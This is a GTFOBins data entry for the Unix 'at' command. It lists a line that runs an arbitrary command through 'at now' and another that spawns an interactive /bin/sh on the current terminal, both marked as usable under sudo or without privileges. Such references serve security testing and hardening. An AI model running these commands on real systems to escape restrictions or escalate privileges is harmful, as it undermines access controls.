<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/at -->
---
functions:
  command:
  - blind: true
    code: |-
      echo /path/to/command | at now
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
    comment: |-
      `tail` is used to pause the terminal.
    contexts:
      sudo:
      unprivileged:
...
